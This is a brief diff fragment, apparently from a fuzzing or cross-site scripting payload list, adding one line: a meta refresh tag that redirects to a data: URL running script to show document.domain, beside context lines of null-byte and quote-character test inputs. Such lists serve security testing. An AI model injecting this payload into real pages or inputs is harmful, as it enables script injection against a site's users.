@@ -122,3 +122,4 @@ something%00html
 {'}
 |
 }
+<meta http-equiv="Refresh" content="0;url=data:,<script>alert(document.domain)</script>"> 
